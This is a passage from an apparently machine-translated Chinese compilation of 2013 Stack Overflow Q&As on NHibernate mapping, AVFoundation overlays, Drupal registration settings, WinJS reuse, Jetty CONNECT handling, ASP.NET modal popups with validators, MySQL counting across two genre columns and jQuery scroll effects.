        HasMany(x => x.Properties).AsEntityMap();
    }
} 
```

我的映射出了点问题，很容易看出我正在尝试完成什么（ebay 将是该逻辑的一个很好的例子 - 来自具有不同属性和可能过滤值的类别的产品）。这是我得到的表（不好）：

```
create table Categories (
    Id INT IDENTITY NOT NULL,
   Name NVARCHAR(255) null,
   ContainingCategoryId INT null,
   primary key (Id)
)

create table CategoryProperties (
    Id INT IDENTITY NOT NULL,
   Name NVARCHAR(255) null,
   CategoryId INT null,
   primary key (Id)
)

create table CategoryPropertyValueCollections (
    Id INT IDENTITY NOT NULL,
   ProductId INT null,
   CategoryProperty_id INT null,
   primary key (Id)
)

create table CategoryPropertyValues (
    Id INT IDENTITY NOT NULL,
   Name NVARCHAR(255) null,
   CategoryPropertyId INT null,
   CategoryPropertyValueCollectionId INT null,
   OrderItemId INT null,
   CategoryProperty_id INT null,
   primary key (Id)
) 
```

为什么使用“ **CategoryPropertyValueCollectionId** ”列创建“ **CategoryPropertyValues** ”？我在映射中做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T12:52:16.897

发现我的问题是使用**HasMany**而不是**HasManyToMany**。

# macos - OS X：为 AVFoundation 视频设置播放控制覆盖

> ID：16204293
> 
> 赞同：1
> 
> 时间：2013-04-25T00:07:09.960
> 
> 标签：macos, video, avfoundation, nsview, playback

我正在尝试设置一个 NSView，它将覆盖在 AVFoundation 正在播放的视频之上。我真的只是想创建一些看起来类似于原生 quicktime 播放器的东西。我正在尝试在 OS X 应用程序上执行此操作。

我设置了一个 NSView，它有两个子视图：一个播放视频的视图和一个包含控件的视图。每当我开始播放视频时，控件视图都会被推到视频播放视图后面，从而使控件视图无用。

我认为问题与覆盖视图层次结构中同一级别的两个子视图有关。这个问题将导致使控件视图成为视频播放视图的子视图的解决方案。问题是要使用 AVFoundation 播放视频，视频播放视图必须成为图层托管视图，这会阻止它具有子视图。

我试图解决问题的事情：

*   用于对视图`addSubview:positioned:relativeTo:`重新排序。
*   支持超级视图和控件视图层。

我可能错误地使用了这些解决方案，所以如果您认为它们应该起作用，请告诉我。

这就是我设置视频播放视图的方式。

```
self.playerItem = [AVPlayerItem playerItemWithAsset:self.asset];
[self.playerItem addObserver:self forKeyPath:@"status"
             options:0 context:&ItemStatusContext];
self.player = [AVPlayer playerWithPlayerItem:self.playerItem];

self.playerLayer = [AVPlayerLayer playerLayerWithPlayer:self.player];

[self.playerView setLayer:self.playerLayer];
[self.playerView setWantsLayer:YES]; 
```

这似乎是某人想要为视频播放做的常见事情，所以如果有人知道解决方案，请告诉我。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-16T23:23:43.390

请注意，文档并没有说图层托管视图不能包含任何子视图，他们只是说您不能将任何子视图添加到图层托管视图。您可以先将所需的所有子视图添加到视图中，然后将其转换为图层托管视图。然而，即使在这种情况下，层和子视图的顺序也不是确定性的。

我通过在我的主视图中创建两个子视图解决了这个问题。其中一个子视图是分层托管的，并具有视频播放层；另一个子视图是包含控件的图层支持视图。这是我解决这个问题的方法：

```
 [self setWantsLayer:YES]; // Turn your main view into a layer backed view, so ordering of subviews is deterministic.

    _controlsView = [[NSView alloc]initWithFrame:frame];        
    _playButtonOverlay = [[NSImageView alloc] initWithFrame:frame];
    [ _playButtonOverlay setImage:[NSImage imageNamed:@"play_overlay"]];
    [_controlsView addSubview:_playOverlay];

    _videoView = [[NSView alloc]initWithFrame:frame];
    _playerLayer = [AVPlayerLayer playerLayerWithPlayer:_player];        
    [_videoView setLayer:_playerLayer]; // make this subview layer-hosted
    [_videoView setWantsLayer:YES];
    [self insertSubview:_videoView belowSubview:_controlsView]; 
```

如果您还没有，请参阅 NSView 中的 setWantsLayer 文档。它说：

“支持层的视图是由核心动画层支持的视图。视图完成的任何绘制都缓存在支持层中。您可以通过调用 setWantsLayer: 值来配置支持层的视图：值为 YES。

“图层托管视图是包含您打算直接操作的核心动画层的视图。您通过实例化核心动画图层类并将该图层提供给视图的 setLayer: 方法来创建图层托管视图。这样做之后，然后调用 setWantsLayer: 值为 YES。此方法顺序至关重要。

# drupal-7 - Drupal 7：实体注册模块：默认或以编程方式启用注册

> ID：16204303
> 
> 赞同：0
> 
> 时间：2013-04-25T00:09:07.973
> 
> 标签：drupal-7, registration

默认情况下，实体注册模块禁用注册。每次从“管理注册 - 设置”选项卡创建节点时，我们都需要启用它。如何使流程自动化？

我尝试在registration.field.inc 的registration_field_info() 中将“status”值更改为“1”，但没有成功。

有没有办法以编程方式进行，否则？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:17:34.530

```
/**
* Implements hook_entity_insert().
*/
function registration_entity_insert($entity, $entity_type) {
  $registration_type = registration_get_entity_registration_type($entity_type, $entity);
  if ($registration_type !== FALSE) {
list($entity_id) = entity_extract_ids($entity_type, $entity);

$settings2 = array(
  'multiple_registrations' => 0,
  'from address' => variable_get('site_mail', ini_get('sendmail_from')),
);

$settings = array(
  'status' => 1,
  'capacity' => 0,
  'send_reminder' => 0,
  'settings' => serialize($settings2),
);

registration_update_entity_settings($entity_type, $entity_id, $settings);
//registration_entity_set_default_settings($entity_type, $entity);
 }
} 
```

参考：

[http://drupal.org/node/1430870](http://drupal.org/node/1430870)

[http://drupal.org/node/1357280](http://drupal.org/node/1357280)

# javascript - 视觉元素的继承和重用设计

> ID：16204308
> 
> 赞同：0
> 
> 时间：2013-04-25T00:09:33.270
> 
> 标签：javascript, html, css, windows-runtime, winjs

我知道使用 C++/C#，您可以创建控件，这些控件是可重用的代码片段，可以通过继承等使用。但是，我不确定是否可以在使用 CSS、JavaScript 和 HTML5 的 Windows 8 商店应用程序构建中使用相同的原则. 如果可能的话，您能否指出每种技术（CSS、JavaScript/WinJS、HTML5）中的哪些关键元素可以帮助设计您的 Windows 8 应用程序以继承和重用视觉元素。

TIA

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T03:23:02.680

因此，对于 HTML 和 JavaScript Windows 8 应用程序，肯定有办法实现相同数量的代码可重用性，事实上大多数模式都使用相同的命名法，所以如果你在谷歌上搜索“winjs”加上你正在寻找的任何东西，你大多数时候都会找到很好的例子。

根据您的具体问题：

*   [导航应用程序](http://msdn.microsoft.com/en-us/library/windows/apps/hh452768.aspx#navigation_models__multi-page_and_single-page)的 default.html 页面中引用的 CSS 类可以在整个应用程序中使用。（实际上，任何加载的样式都会保留在内存中，因此如果您访问详细信息页面并且它的标题样式不是特定于实际页面的，它可能会在首次加载后应用于另一个页面的详细信息页面。）
*   HTML 页面可以在页面控件和 iframe 中引用，因此您可以在多个位置重复使用这些布局，就像使用普通网站一样。
*   JavaScript，因为它适用于 Windows 8 应用程序，实际上非常充实。环境中内置了大量用于代码组织的实用程序，用于[命名空间](http://msdn.microsoft.com/en-us/library/windows/apps/hh967793.aspx)、[定义和派生类](http://msdn.microsoft.com/en-us/library/windows/apps/hh967790.aspx)，所有这些都允许轻松[创建控件](http://www.gotdibbs.net/blog/2012/11/11/a-skeleton-for-custom-controls-with-winjs/)等。

这当然更不用说其他人对可在平台上使用的预先存在的 HTML/CSS/JavaScript 技术的评论了。有喜欢的 JQuery 插件吗？它可能仍然适用于 Windows 8。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T03:31:42.603

在基于 javascript 的 Windows 商店应用程序中，我遇到的代码重用很少。

1.  自定义控件 - 有时我们需要构建一个可以跨页面重用的自定义控件，有时也可以在多个项目中重用。[此链接](http://blogs.msdn.com/b/windowsappdev/archive/2012/10/11/building-a-custom-control-using-the-windows-library-for-javascript-winjs.aspx)概述了使用 WinJS lib 构建自定义控件。例如 - 我为 ImageSelectControl 构建了一个自定义控件。很多时候，我们需要一个控件来显示所选图像，允许用户更改/删除所选图像，在控件中显示所选图像的缩略图等。我在应用程序的多个页面中使用此控件。
2.  default.css - 这包含项目的默认样式。在构建几个应用程序时，我遇到了一组默认 css 类，这些样式是在 vs 模板生成的默认值之上添加的。我跨项目复制此文件。例如 - 每个应用程序都有一个“品牌”配色方案。基于此，您需要设置锚点悬停颜色，输入选择控件背景等。这些规则可以跨项目重复使用，只有品牌颜色会发生变化。在你的 default.css 中识别和组织这些规则并在项目中重用它是很好的。
3.  default.js - 此文件还针对应用程序生命周期事件处理进行了一些更新。如果您保留项目的数据模型分离，则可以跨项目重复使用此文件。
4.  [WinJS.Class.derive](http://msdn.microsoft.com/en-us/library/windows/apps/br229815.aspx)函数可用于定义继承。但到目前为止，我还没有在我的项目中遇到过大量使用它的情况。
5.  您会遇到不同类型页面的个人模板（一组 .html/css/js 文件）。重复使用它们很好。我已经创建了其中的几个（不是所有这样的模板），但我计划创建它们。当您跨多个应用程序工作时，最好留意此类模板并从您的模板之一开始您的页面开发。模板可以简单地维护为一个文件夹，比如模板\，带有一组 .html/.js/.css 文件，并将这些文件复制粘贴到您的新页面文件夹中。
6.  实用程序库 - 您将构建一组实用程序帮助函数。我将它们保存在 js/utils.js 并跨项目共享。例如 - Utils.handleError(error)：向用户显示错误信息；Utils.UI.initializeWithProgressRing 加载带有承诺的页面并在中心显示进度环，直到页面加载；你的 WinJS.xhr 包装器。在构建帮助函数之前检查 WinJS.Utilities 命名空间是件好事。我有时在这里找到了所需的功能。

总而言之-在我的情况下，代码重用发生在重用 js 实用程序库、页面模板、default.js、default.css、自定义控件时。继承是可用的，但我没有使用太多。HTH。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-25T00:20:04.357

SASS 为包含和重用 CSS 样式提供了出色的工具：http: [//sass-lang.com/](http://sass-lang.com/)

对于 HTML 和 JS，您可以使用 PHP 将代码片段存储在变量和数组中。同样，同样的逻辑也适用于在 JS 中重新生成 HTML 元素......只需将标记或片段存储在变量中：[http ://www.w3schools.com/js/js_variables.asp](http://www.w3schools.com/js/js_variables.asp)

这有帮助吗？

# java - 没有为 CONNECT 请求调用 Servlet service() 方法

> ID：16204309
> 
> 赞同：0
> 
> 时间：2013-04-25T00:09:41.740
> 
> 标签：java, http, servlets, https, jetty

我正在尝试使用 Servlet 3.0 在 Jetty 中编写转发代理。

我有一个简单的代码-

```
public class testServlet extends HttpServlet {

   @Override
    protected  void service (HttpServletRequest req, HttpServletResponse resp) throws   ServletException, IOException {
       System.out.println(req.toString());        

  }

} 
```

如果客户端请求 HTTP 站点，则调用上述服务方法，但是当请求 HTTPS 站点时（使用 HTTP Connect 方法），则不调用上述方法。为什么？

我显然可以使用 Jetty 的处理程序，但我更喜欢使用 servlet，以便代码保持一定的可移植性（我可以在 Glassfish、Tomat、Jetty 等下运行它）

知道可能出了什么问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T03:21:49.280

It is possible to deliver a CONNECT request to a Servlet service method, but it is ultimately futile to do so because it is impossible to handle a CONNECT inside a servlet. You don't really have access to the raw IO streams, only the HTTP content of the request/response. You can almost make his work, but never efficiently (no async IO etc.) So ultimately you will end up falling back to Jetty APIs anyway.

Also, why not just build on the support already provided by Jetty:

[http://download.eclipse.org/jetty/stable-9/xref/org/eclipse/jetty/proxy/ConnectHandler.html](http://download.eclipse.org/jetty/stable-9/xref/org/eclipse/jetty/proxy/ConnectHandler.html) [http://download.eclipse.org/jetty/stable-9/xref/org/eclipse/jetty/proxy/ProxyServlet.html](http://download.eclipse.org/jetty/stable-9/xref/org/eclipse/jetty/proxy/ProxyServlet.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T04:48:52.813

你这样做是错误的。Servlet API 和框架用于编写 servlet，即端点。不适用于编写 HTTP 代理。HTTP 代理从根本上说是非常简单的东西，它可以理解一个命令，`CONNECT`然后在两个方向上复制字节。即使您可以将其作为 servlet 工作（几乎可以肯定不能），性能影响也会非常严重，因为容器会在调用您之前读取整个请求，并且可能还会缓冲响应。您不希望所有增加的延迟。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T00:25:10.067

不确定这是否可能。

一般来说，Servlet 需要来自请求的上下文来知道要执行哪个 Servlet。这是 pathSpec 到 Servlet 描述符中存在的 Servlet 的映射。

对于 CONNECT 请求，实际上并没有用于查找此映射的上下文。（换句话说，Servlet 容器很难根据 CONNECT 请求中的信息知道要执行哪个 Servlet）

一些想法：

*   尝试使用 pathSpec 设置过滤器`"/*"`（适用于所有路径规范）。
*   将您的 Servlet 设置为 pathSpec `"/"`（对于默认 servlet）。注意：可能需要先禁用标准 DefaultServlet `${jetty.home}/etc/webdefault.xml`。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-25T01:47:20.417

```
@Override
protected void service(HttpServletRequest arg0, HttpServletResponse arg1)
        throws ServletException, IOException {
    // TODO Auto-generated method stub
    super.service(arg0, arg1);
}

@Override
public void service(ServletRequest arg0, ServletResponse arg1)
        throws ServletException, IOException {
    // TODO Auto-generated method stub
    super.service(arg0, arg1);
} 
```

您可以比较这两种方法的异同。但是这两个方法都是方法参数的子类不同

## 或者你可以尝试使用doPOST、doGET方法。

不会说英语真的好痛...呵呵 我需要用翻译工具来回答你的问题

# gridview - 面板上的 ModalPopupExtender 和 RequiredFieldValidator

> ID：16204311
> 
> 赞同：1
> 
> 时间：2013-04-25T00:10:04.073
> 
> 标签：gridview, asp.net-ajax, modalpopupextender

我是 C# 的 asp.net 新手，我需要更新 Gridview 中的一行，但我必须使用 AJAX 中的 ModalPopupExtender 和我的表的某些字段，必须是强制性的，所以，我开始使用这个控件以这种形式：首先我将一个按钮置于显示模式“none”中，作为更新面板的触发器，在gridview中我放置了一个按钮名称“Edit”，它显示了ModalPopupExtender代码，但我的麻烦来了，当我放了RequiredFieldValidator，ModalPopupExtender 没有显示，这是我的代码，请帮助我，还有一件事，我不能使用Javascript。

```
<%@ Page Title="" Language="C#" MasterPageFile="~/MasterPage.master" AutoEventWireup="true" CodeFile="probando.aspx.cs" Inherits="Menus_Compras_probando" %>
<%@ Register Assembly="AjaxControlToolkit" Namespace="AjaxControlToolkit" TagPrefix="asp" %>

<asp:Content ID="Content1" ContentPlaceHolderID="head" Runat="Server">
<style type="text/css">
.modalBackground
{
background-color: Gray;
filter: alpha(opacity=80);
opacity: 0.8;
z-index: 10000;
}
</style>
</asp:Content>

<asp:Content ID="Content2" ContentPlaceHolderID="cphContenidoPrincipal" Runat="Server">

<asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" 
    DataSourceID="ObjectDataSource1" DataKeyNames="_adqProveedorId">
    <Columns>
        <asp:BoundField DataField="_adqProveedorId" HeaderText="_adqProveedorId" 
            SortExpression="_adqProveedorId" />
        <asp:BoundField DataField="_Nombre" HeaderText="_Nombre" 
            SortExpression="_Nombre" />
        <asp:BoundField DataField="_Direccion" HeaderText="_Direccion" 
            SortExpression="_Direccion" />
        <asp:BoundField DataField="_OtraIdent" HeaderText="_OtraIdent" 
            SortExpression="_OtraIdent" />
        <asp:BoundField DataField="_Telefono" HeaderText="_Telefono" 
            SortExpression="_Telefono" />
        <asp:BoundField DataField="_Fax" HeaderText="_Fax" SortExpression="_Fax" />
        <asp:BoundField DataField="_Email" HeaderText="_Email" 
            SortExpression="_Email" />
        <asp:BoundField DataField="_RepresLegal" HeaderText="_RepresLegal" 
            SortExpression="_RepresLegal" />
        <asp:BoundField DataField="_NumRUC" HeaderText="_NumRUC" 
            SortExpression="_NumRUC" />
        <asp:CheckBoxField DataField="_PersonalPlanta" HeaderText="_PersonalPlanta" 
            SortExpression="_PersonalPlanta" />
        <asp:CheckBoxField DataField="_AutorizaTrasladoAF" 
            HeaderText="_AutorizaTrasladoAF" SortExpression="_AutorizaTrasladoAF" />
        <asp:BoundField DataField="_Titulo" HeaderText="_Titulo" 
            SortExpression="_Titulo" />
        <asp:BoundField DataField="_CodInt" HeaderText="_CodInt" 
            SortExpression="_CodInt" />
        <asp:BoundField DataField="_objClasificaProveedorId" 
            HeaderText="_objClasificaProveedorId" 
            SortExpression="_objClasificaProveedorId" />
        <asp:BoundField DataField="_objAgrupacionPID" HeaderText="_objAgrupacionPID" 
            SortExpression="_objAgrupacionPID" />
        <asp:BoundField DataField="_objTipoDedIRID" HeaderText="_objTipoDedIRID" 
            SortExpression="_objTipoDedIRID" />
        <asp:TemplateField>
            <ItemTemplate>
                <asp:Button ID="btnEditar" runat="server" onclick="btnEditar_Click" 
                    Text="Editar" />
            </ItemTemplate>
        </asp:TemplateField>
    </Columns>
</asp:GridView>
<asp:ObjectDataSource ID="ObjectDataSource1" runat="server" 
    DataObjectTypeName="Sistema.BO.AdqProveedor" DeleteMethod="BorrarProveedor" 
    OldValuesParameterFormatString="original_{0}" 
    SelectMethod="SelectAllProveedores" TypeName="Sistema.BLL.BLLAdqProveedor" 
    UpdateMethod="AddUpdateProveedor"></asp:ObjectDataSource>

    <br /><br />

    <asp:Button ID="btnShowPopup" runat="server" style="display:none" />
    <asp:ModalPopupExtender ID="ModalPopupExtender1" runat="server" TargetControlID="btnShowPopup" PopupControlID="pnlpopup"
CancelControlID="btnCancel" BackgroundCssClass="modalBackground">
</asp:ModalPopupExtender>

<asp:Panel ID="pnlpopup" runat="server" BackColor="White" style="display:none">
<asp:UpdatePanel ID="UpdatePanel1" runat="server">
<ContentTemplate>
            <table>
                <tr>
                    <td>
                        <asp:Label ID="Label1" runat="server" Text="Nombre:">    </asp:Label>
                    </td>
                    <td style="width: 315px">
                        <asp:TextBox ID="tbNombre" runat="server" Width="200px"></asp:TextBox>

                    </td>
                    <td>
                        <asp:RequiredFieldValidator ID="RequiredFieldValidator1" runat="server" 
                            ControlToValidate="tbNombre" ErrorMessage="Campo Obligatorio"></asp:RequiredFieldValidator>
                    </td>
                    <td>
                        <asp:Label ID="Label2" runat="server" Text="Dirección:"></asp:Label>
                    </td>
                    <td>
                        <asp:TextBox ID="tbDir" runat="server" Width="300px"></asp:TextBox>
                    </td>
                </tr>
                <tr>
                    <td>
                        <asp:Label ID="Label3" runat="server" Text="Otra Identificación"></asp:Label>
                    </td>
                    <td style="width: 315px">
                        <asp:TextBox ID="tbOtraId" runat="server"></asp:TextBox>
                    </td>
                    <td>
                        <asp:Label ID="Label4" runat="server" Text="Teléfono"></asp:Label>
                    </td>
                    <td>
                        <asp:TextBox ID="tbTel" runat="server"></asp:TextBox>
                    </td>
                </tr>
                <tr>
                    <td>
                        <asp:Label ID="Label5" runat="server" Text="Fax:"></asp:Label>
                    </td>
                    <td style="width: 315px">
                        <asp:TextBox ID="tbFax" runat="server"></asp:TextBox>
                    </td>
                    <td>
                        <asp:Label ID="Label6" runat="server" Text="Email"></asp:Label>
                    </td>
                    <td>
                        <asp:TextBox ID="tbMail" runat="server"></asp:TextBox>
                    </td>
                </tr>
                <tr>
                    <td>
                        <asp:Label ID="Label7" runat="server" Text="Representación Legal:"></asp:Label>
                    </td>
                    <td style="width: 315px">
                        <asp:TextBox ID="tbRepLegal" runat="server"></asp:TextBox>
                    </td>
                    <td>
                        <asp:Label ID="Label8" runat="server" Text="Número RUC:"></asp:Label>
                    </td>
                    <td>
                        <asp:TextBox ID="tbRuc" runat="server"></asp:TextBox>
                    </td>
                </tr>
                <tr>
                    <td>
                        <asp:Label ID="Label9" runat="server" Text="Personal Planta:"></asp:Label>
                    </td>
                    <td style="width: 315px">
                        <asp:CheckBox ID="cbPersonalPlanta" runat="server" />
                    </td>
                    <td>
                        <asp:Label ID="Label12" runat="server" Text="Clasificación:"></asp:Label>
                    </td>

                </tr>
                <tr>
                    <td>
                        <asp:Label ID="Label11" runat="server" Text="Título:"></asp:Label>
                    </td>
                    <td style="width: 315px">
                        <asp:TextBox ID="tbTitulo" runat="server"></asp:TextBox>
                    </td>
                    <td>
                        <asp:Label ID="Label14" runat="server" Text="Tipo deducción IR:"></asp:Label>
                    </td>

                </tr>
                <tr>
                    <td colspan="4" style="height: 23px">
                        <asp:Label ID="lblIdProv" runat="server" Visible="False"></asp:Label>
                        <asp:Label ID="lblIdClas" runat="server" Visible="False"></asp:Label>
                        <asp:Label ID="lblAgrId" runat="server" Visible="False"></asp:Label>
                        <asp:Label ID="lblDedId" runat="server" Visible="False"></asp:Label>
                    </td>
                </tr>
                <tr>
                    <td colspan="4">
                        <asp:Label ID="lblInfo" runat="server"></asp:Label>
                        <asp:Image ID="Image1" runat="server" Height="16px" Width="16px" />
                    </td>
                </tr>
                <tr>
                    <td>
                        &nbsp;</td>
                    <td style="width: 315px">
                        &nbsp;</td>
                    <td>
                        &nbsp;</td>

                </tr>
            </table>

    <asp:Label ID="lblRes" runat="server" Text=""></asp:Label>
    <asp:Button ID="btnAct" runat="server" CommandName="Update" Text="Update" onclick="btnAct_Click" />
    <asp:Button ID="btnCancel" runat="server" Text="Cancel" />
</ContentTemplate>
</asp:UpdatePanel> 
```

这是我背后的代码

```
protected void btnEditar_Click(object sender, EventArgs e)
{
    Button btndetails = sender as Button;
    GridViewRow gvrow = (GridViewRow)btndetails.NamingContainer;
    tbNombre.Text = gvrow.Cells[1].Text;
    this.ModalPopupExtender1.Show();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-07-06T20:37:49.213

这个今天为我指出了正确的方向，所以我想我会发布一个实际的代码解决方案。正如上面在评论中提到的，关键是向所有RequiredFieldValidator 控件添加一个**ValidationGroup**标签，这样您就可以控制何时应用验证 -

```
 <%@ Page Language="vb" AutoEventWireup="false" CodeBehind="Default2.aspx.vb" Inherits="ModalPopupExtenderExample.Default2" %>
    <%@ Register Assembly="AjaxControlToolkit" Namespace="AjaxControlToolkit" TagPrefix="ajaxToolkit" %>

    <!DOCTYPE html>
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head runat="server"><title>Test</title>

    <style type="text/css">
    body{background-color: grey; font-family: Arial, Helvetica, sans-serif;}
    .popup{background-color: white; padding:10px; border-radius:5px;}
    </style>

    </head>

    <body>
        <form id="form1" runat="server">
            <asp:ScriptManager ID="ScriptManager1" runat="server"></asp:ScriptManager>
            <asp:Label ID="LabelAddNewContact" runat="server" Text="Add new contact"></asp:Label>
            <asp:Button ID="ButtonAddNewContact" runat="server" Text="Add" />

            <asp:Panel ID="ModalPanelAddNewContact" runat="server" Width="500px" CssClass="popup">

                <div>
                    <asp:Label ID="LabelFirstName" runat="server" Text="First Name"></asp:Label><span class="requiredSpan"> *</span>
                    <asp:TextBox ID="TextBoxFirstName" runat="server"></asp:TextBox>
                    <asp:RequiredFieldValidator ID="RequiredFieldValidatorFirstName" ValidationGroup="AddNewContact" runat="server" ControlToValidate="TextBoxFirstName" Display="Dynamic" EnableClientScript="true" ErrorMessage="Required"></asp:RequiredFieldValidator>
                </div>
                <div>
                    <asp:Label ID="LabelEmail" runat="server" Text="Email"></asp:Label><span class="requiredSpan"> *</span>
                    <asp:TextBox ID="TextBoxEmail" runat="server"></asp:TextBox>
                    <asp:RequiredFieldValidator ID="RequiredFieldValidatorEmail" runat="server" ValidationGroup="AddNewContact" ControlToValidate="TextBoxEmail" Display="Dynamic" EnableClientScript="true" ErrorMessage="Required"></asp:RequiredFieldValidator>            
                </div>

                <asp:Button ID="ButtonModalPanelAddNewClose" runat="server" Text="Cancel" />
                <asp:Button ID="ButtonModalPanelSaveNewContact" runat="server" Text="Save this contact" ValidationGroup="AddNewContact" />
                <asp:Button ID="ButtonAddBrandNewContact" runat="server" Text="Add" style="display:none"/>
            </asp:Panel>

            <ajaxToolkit:ModalPopupExtender ID="ModalPopupExtenderAddNewContact" runat="server" TargetControlID="ButtonAddBrandNewContact"
                PopupControlID="ModalPanelAddNewContact" CancelControlID="ButtonModalPanelAddNewClose" BehaviorID="1" />
        </form>
    </body>
    </html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:17:18.750

尝试将整个代码放在更新面板中

# mysql - MySql 同一张表的两个不同列的不同值

> ID：16204317
> 
> 赞同：2
> 
> 时间：2013-04-25T00:11:10.450
> 
> 标签：mysql

我有 2 个表，Products 和 Genre。在 products 表中，它的所有产品信息包括两个流派（genre_id 和genre_id2），只有第一个是必需的，所以第二个可能有空值

在流派表中，我有所有可能的流派名称，其 ID 与产品表的流派 ID 相关

```
餐桌用品
--------------
id product_name 流派_id 流派_id2
-------------------------------------------------
1 产品 1 2
2 产品2 2
3 产品3 1 4
4 产品4 3 4

表类型
------------
id 流派名称
-------------------------------------------------
1 类型1
2 流派2
3 流派3
4 流派4

```

我想选择所有不同的类型，看看我有多少该类型的产品

像这样的东西

```
结果
------
流派 ID 计数
----------------------
    1 2
    2 2
    3 1
    4 2

```

我有这个声明

```
SELECT DISTINCT p.genre_id AS genre, g.genre_name,  COUNT(p.genre_id) AS cnt
FROM products AS p
JOIN genre AS g
ON p.genre_id=g.id
GROUP BY genre_id
ORDER BY cnt DESC 
```

但仅适用于genre_id，我不知道如何在此语句中合并genre_id2 并添加与genre_id 一致的计数并列出不同的计数

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T00:16:27.407

```
SELECT  a.ID, COUNT(DISTINCT b.ID) + COUNT(DISTINCT c.ID)
FROM    Genre a
        LEFT JOIN products b
            ON a.ID = b.genre_id
        LEFT JOIN products c
            ON a.ID = c.genre_id2
GROUP BY a.ID 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!2/b8bd0b/2)

`genre_id and genre_ID2`警告：如果您有相同前任的记录，这将不起作用

```
5     product5            1            1 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T00:24:38.500

鉴于您有`genre`要加入的表格，“明显”的解决方案是：

```
SELECT genre.id AS genre, COUNT(products.id) AS n
FROM genre
  LEFT JOIN products ON genre.id IN (genre_id, genre_id2)
GROUP BY genre.id 
```

（[SQLFiddle 演示](http://sqlfiddle.com/#!2/7419d/2/0)）

但是，如果您不这样做，您仍然可以使用`UNION`：

```
SELECT genre, COUNT(*) as n
FROM
  (SELECT id, genre_id AS genre FROM products
   WHERE genre_id IS NOT NULL
   UNION
   SELECT id, genre_id2 AS genre FROM products
   WHERE genre_id2 IS NOT NULL) AS foo
GROUP BY genre 
```

（[SQLFiddle 演示](http://sqlfiddle.com/#!2/3f672/2/0)）

* * *

**编辑：**该`UNION`方法不会（*也不能*）返回任何计数为 0 的行。“明显”方法可以，因为我使用了`LEFT JOIN`. 如果您不*想要*它们，您也可以通过将 替换`LEFT JOIN`为`JOIN`.

* * *

**编辑2：**使用适当的索引（每个`genre_id`和一个`genre_id2`），并根据实际数据集的大小和内容，使用依赖子查询的以下解决方案*可能*比上述任何一个更有效：

```
SELECT genre.id AS genre,
  (SELECT COUNT(*) FROM products WHERE genre.id = genre_id) +
  (SELECT COUNT(*) FROM products WHERE genre.id = genre_id2) AS n
FROM genre 
```

要消除计数为零的行，只需坚持

```
HAVING n > 0 
```

在查询结束时。（[SQLFiddle 演示](http://sqlfiddle.com/#!2/a6695/1/0)）这实际上是一种用于过滤掉此类行的通用方法。

我没有将此与[JW 的解决方案](https://stackoverflow.com/a/16204361)进行基准测试，以查看哪个更有效，因为这需要一些实际数据。如果您的数据集相当小，则无论哪种方式都可能无关紧要。

（结果将很大程度上取决于 MySQL 对其优化的程度：`LEFT JOIN`如果天真地执行，JW 的嵌套 s 在大型数据集上可能会变得非常慢，但我不确定 MySQL 是否足够聪明，不会这样做。同时，我的依赖子查询可能不会得到太多优化，但只要有必要的索引，即使是简单的执行也应该相当快。）

* * *

**编辑3：**请注意，一般来说，这个问题是由糟糕的表格设计引起的。最好将架构更改为使用[联结表](http://en.wikipedia.org/wiki/Junction_table)，如[本答案](https://stackoverflow.com/a/9571730/411022)中所述。

这将允许您让每个产品属于任意数量的类型，并且可以让您使用如下简单查询轻松计算每个类型中的产品：

```
SELECT genre.id AS genre, COUNT(products.id) AS n
FROM genre
  JOIN product_genre ON genre.id   = product_genre.genre
  JOIN products      ON product.id = product_genre.product
GROUP BY genre.id 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T00:19:14.833

用genre_id2写一个类似的语句，和原来的结果做一个union

# javascript - 根据滚动位置更改 div 内容

> ID：16204318
> 
> 赞同：5
> 
> 时间：2013-04-25T00:11:10.553
> 
> 标签：javascript, jquery, html

我希望从另一个 Stack Exchange 帖子中使用[此代码获得一些帮助。](http://jsfiddle.net/Nsubt/)下面是javascript：

```
$(window).on("scroll resize", function(){
    var pos=$('#date').offset();
    $('.post').each(function(){
        if(pos.top >= $(this).offset().top && pos.top <= $(this).next().offset().top)
        {
            $('#date').html($(this).html()); //or any other way you want to get the date
            return; //break the loop
        }
    });
});

$(document).ready(function(){
  $(window).trigger('scroll'); // init the value
}); 
```

我已经在我自己的网站上实现了它：http: [//peterwoyzbun.com/newscroll/scroll.html](http://peterwoyzbun.com/newscroll/scroll.html)。当滚动位置到达某一点时，框中的信息会发生变化。目前，变化的内容直接来自div“.post”。也就是说，当用户滚动到给定的“.post”时，固定的灰色框会加载“.post”中的内容。

我想做的是让灰色框显示用户当前看到的内容的描述。因此，当用户到达 div“content1”时，灰色框会显示“content1”的文本描述。也许当达到“content1”时，div“description1”在灰色框中变得不隐藏了？

任何帮助将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T00:26:37.193

在包含描述的每个部分中添加一个隐藏元素，例如：

```
<div id="content1">
<p class="description" style="display: none;">content1 description</p>
....
</div> 
```

然后在 javascript 中获取相关部分的描述，如下所示：

```
if(pos.top >= $(this).offset().top && pos.top <= $(this).next().offset().top)
        {
            $('#date').html($(this).find('.description').text());
            return;
        } 
```

[提琴手](http://jsfiddle.net/arcm111/6RHys/)

# ruby-on-rails - 如何在“If 语句”中使用“最后一个”和订单条件？

> ID：16204320
> 
> 赞同：0
> 
> 时间：2013-04-25T00:11:30.383
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我试图这样编码。
这有什么问题？

```
